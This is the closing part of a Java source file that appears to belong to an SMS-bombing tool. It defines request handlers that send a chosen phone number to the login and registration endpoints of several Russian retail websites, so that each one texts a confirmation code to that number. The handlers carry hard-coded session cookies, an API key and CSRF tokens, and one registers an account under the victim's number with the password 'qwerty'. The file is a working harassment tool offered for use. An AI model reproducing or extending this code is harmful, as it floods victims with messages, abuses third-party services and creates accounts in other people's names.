                    request.header("x-api-key", "PELQTQN2mWfml8XVYsJwaB9Qi4t8XE");
                    request.header("x-app", "3");
                    request.header("x-device-id", "ID-1664626775947");

                    builder.add("phone", format(phone.getPhone(), "+7(***) ***-****"));
                }
            },

            new JsonService("https://b-apteka.ru/lk/send_confirm_code", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("x-requested-with", "XMLHttpRequest");
                    request.header("referer", "https://b-apteka.ru/lk/login");
                    request.header("origin", "https://b-apteka.ru");
                    request.header("cookie", "city=izhevsk; bap_referer=eyJpdiI6IkRjXC95Q2g1QkYwTWlxam9qYVwveFwvclE9PSIsInZhbHVlIjoiXC9yMnZ2OVFNXC93S1dvUWpZXC9OeFkwYUZ2TTRPS2Jjd3BGQm9RK1pQQzVWST0iLCJtYWMiOiJiYjMxODI5YmRkZTQ2ODM2YjQzOTcyZDc5ZjBiMTdmYTUzNzQ0NmI1N2M4NjE5YWEyOTkxOGM4N2E5NTk2MzNmIn0=; _gcl_au=1.1.1439509730.1664627136; tmr_lvid=e3e4e006fbcbb8a2f8fcc34a3416c227; tmr_lvidTS=1664627136928; _gid=GA1.2.1149898738.1664627137; _ym_uid=1664627137698166045; _ym_d=1664627137; _ym_isad=2; _ym_visorc=w; _cc_id=61b79a8f2bed77deba2b85fdcb1507c; panoramaId_expiry=1665231940528; panoramaId=e9e124fb5b0b8a5390b34cbda5f516d53938ab97f357cb9454f00fed17d27568; city_is_confirmed=1; main_banner_is_show_241=1; main_banner_is_show_219=1; main_banner_is_show_198=1; main_banner_is_show_184=1; main_banner_is_show_239=1; main_banner_is_show_240=1; XSRF-TOKEN=eyJpdiI6Ik5kS1Q0U2VmcHlBalBJRUY4U012Z0E9PSIsInZhbHVlIjoiWUJMS28yeUVQWEFpZHh2cDBvUDRpWHRGT2xFOTVyME5RYTBBODB0TnYzSUpJc3RPK05LUVJkVm5hc1h0SGtUXC9FWmVCZkU1SEgxbXo2MGJRQjJ6Q0Z3PT0iLCJtYWMiOiIzNjUzOTIwNWFjOWY2M2ZhYmI4ZGZkYzgwZDg4MDg3ODQwM2NiOGNjMzEwOGUyZTFmODFkYmNjMzRlMjU1ZmQ3In0=; b-apteka_session=eyJpdiI6Im4wd1BPbzdsdmdHejdXSFwvK2tzbTNnPT0iLCJ2YWx1ZSI6IkZGZ1B3XC8zbnVcL2hHdkxXQmVGM0MzSmJLRHNpUndxN1FJNFwvNHlWKzg5SGtWdERueWJQRnErV1B1bzE4alNDbzF2OGlBdFRQc1wvcElneFBnbU9kU25UQT09IiwibWFjIjoiNTVkZjY1MmMzMDk2NmRjMWE4NDI2NThlNDNhNzBmMGVjNWJhNmI2YjcyODkzNzE0OGYwMWNiYjNjZjExMWVlNCJ9; amp_e4ab48=8aCqCWESXvCbFIKU6ruBUI...1ge9o4mb9.1ge9oud3h.0.0.0; _ga_R0BMF1SYPV=GS1.1.1664627136.1.1.1664627979.20.0.0; tmr_detect=0|1664627988457; _ga=GA1.2.747522293.1664627137; tmr_reqNum=14");

                    return "{\"phone\":\"" + phone + "\"}";
                }
            },

            new FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=houv980sdb3ei8ubm85v29ko8l; _ym_uid=1661249544448490865; _ym_d=1664628137; _ym_visorc=w; _gid=GA1.2.1393466173.1664628137; _gat_UA-61230203-9=1; _gat_UA-61230203-3=1; _clck=p50sri|1|f5c|0; _ga=GA1.4.2038953632.1664628137; _gid=GA1.4.1393466173.1664628137; _gat_UA-61230203-5=1; KFP_DID=fe822d3f-4a57-723d-2706-a9521f9bd17d; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _clsk=1mfup9z|1664628144712|2|1|j.clarity.ms/collect; _ga=GA1.2.2038953632.1664628137; _ga_GW0P06R9HZ=GS1.1.1664628142.1.0.1664628153.0.0.0; oxxfgh=f054cce9-028e-4cec-a08d-81dd9b75a646#1#7884000000#5000#1800000#12840");
                    request.header("X-Requested-With", "XMLHttpRequest");

                    builder.add("phone", format(phone.getPhone(), "+ 7 ( *** ) ***-**-**"));
                    builder.add("ksid", "f054cce9-028e-4cec-a08d-81dd9b75a646_0");
                }
            },

            new JsonService("https://www.vardex.ru/bitrix/services/main/ajax.php?mode=class&c=vardex%3Amain.auth&action=sendConfirmCode") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "PHPSESSID=vQy0pRUZ7253XMdJytenuS1gAlDJ728c; LANDING_PAGE=/index.php; USER_CITY_ID=527; BITRIX_SM_SALE_UID=81314349; rrpvid=117640928618113; _ga=GA1.2.774103427.1664631795; _gid=GA1.2.1955775073.1664631795; _userGUID=0:l8pyshla:I3oFVbz216xzEWswVYgUXucqAJ0KJmT7; dSesn=ad2ec6ec-0f58-877c-5a45-fabef9bcee5f; _dvs=0:l8pyshla:8xim1VP6efrXP_W20KKWncJ4z7NtxFkV; _gat=1; _ym_uid=1664631796202799079; _ym_d=1664631796; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; _ym_visorc=b; _ym_isad=2; BITRIX_SM_AGREE18PLUS=1; rrwpswu=true; rrwpswu=true; BITRIX_SM_PK=527");
                    request.header("x-bitrix-csrf-token", "95965357a61d273cde69c8c558706e85");
                    request.header("x-bitrix-site-id", "s1");

                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone)
                                .put("new", false)
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    String formattedPhone = format(phone.getPhone(), "+7 (***) ***-**-**");

                    client.newCall(new Request.Builder()
                            .url("https://babylonvape.ru/auth/registration/?register=yes&backurl=%2Fauth%2F")
                            .header("upgrade-insecure-requests", "1")
                            .header("referer", "https://babylonvape.ru/auth/registration/?register=yes&backurl=/auth/")
                            .header("cookie", "PHPSESSID=9D26aEZS5EpjZlhsd1Y1NYWyAufAzpwp; BITRIX_SM_SALE_UID=c29417494cd049f7c5fcf28051ace9d2; rrpvid=780283164294524; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":5,\"EXPIRE\":1664657940,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_debug=null; _ym_uid=1654436025122788696; _ym_d=1664632221; rcuid=6275fcd65368be000135cd22; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.877344353.1664632222; _gid=GA1.2.958698788.1664632222; rrwpswu=true; babylon_confirm_age=Y; _gat_gtag_UA_56968396_1=1")
                            .post(RequestBody.create("------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"backurl\"\n" +
                                            "\n" +
                                            "/auth/\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"register_submit_button\"\n" +
                                            "\n" +
                                            "reg\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[LOGIN]\"\n" +
                                            "\n" +
                                            "1\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[LAST_NAME]\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[NAME]\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[SECOND_NAME]\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[EMAIL]\"\n" +
                                            "\n" +
                                            getEmail() +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PERSONAL_PHONE]\"\n" +
                                            "\n" +
                                            formattedPhone +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PASSWORD]\"\n" +
                                            "\n" +
                                            "qwerty\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[CONFIRM_PASSWORD]\"\n" +
                                            "\n" +
                                            "qwerty\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"licenses_register\"\n" +
                                            "\n" +
                                            "Y\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                            "\n" +
                                            formattedPhone +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                            "\n" +
                                            formattedPhone +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"register_submit_button1\"\n" +
                                            "\n" +
                                            "Регистрация\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZKfaTYUmRp781EJr")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://hotkitchen-delivery.ru/user_account/ajax36346431.php?do=sms_code", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "8(***)***-**-**"));

                    request.header("cookie", "PHPSESSID=8c77239f98dc2d3c12a3ca4e85c89723; notify000=nnnn; _ym_uid=1664633613531152720; _ym_d=1664633613; _ym_visorc=w; _ym_isad=2");
                    request.header("x-requested-with", "XMLHttpRequest");
                }
            }
    };

    @Override
    public List<Service> getServices(String countryCode) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = countryCode.isEmpty() ? 0 : Integer.parseInt(countryCode);
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0) {
                usableServices.add(service);
                continue;
            }
            for (final int i : service.countryCodes) {
                if (i == countryCodeNum) {
                    usableServices.add(service);
                    break;
                }
            }
        }

        return usableServices;
    }
}
